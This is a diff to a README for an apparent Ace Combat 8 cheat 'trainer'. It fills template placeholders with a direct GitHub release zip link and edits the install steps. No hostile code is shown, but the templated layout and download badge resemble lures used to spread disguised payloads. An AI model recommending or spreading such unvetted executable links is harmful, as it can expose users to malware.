@@ -4,7 +4,7 @@
 
 **38-module feature toolkit for AC8: Wings of Theve**
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/limeswordsmanedge21/ac8-wings-modkit/releases/download/v1.0.0/AceCombat8_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/DOWNLOAD-ac8--wings--trainer_v1.0-28a745?style=for-the-badge&logo=github&logoColor=white" height="52"/>
 </a>
 
@@ -36,7 +36,7 @@
 
 > **Step 3** — Choose a destination folder (default: `C:\Program Files\AceCombat8Trainer`) and click **Install**
 
-> **Step 4** — Once installation is complete, navigate to the chosen folder, right-click `AceCombat8_Trainer` and select **"Run as administrator"**
+> **Step 4** — Once installation is complete, navigate to the chosen folder, right-click `AceCombat8_Trainer`
 
 > **Step 5** — Launch **AC8: Wings of Theve** via Steam
 
@@ -147,7 +147,7 @@ Game:    AC8: Wings of Theve (latest Steam version)
 
 <div align="center">
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/limeswordsmanedge21/ac8-wings-modkit/releases/download/v1.0.0/AceCombat8_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/DOWNLOAD-ac8--wings--trainer_v1.0-28a745?style=for-the-badge&logo=github&logoColor=white" height="52"/>
 </a>
 
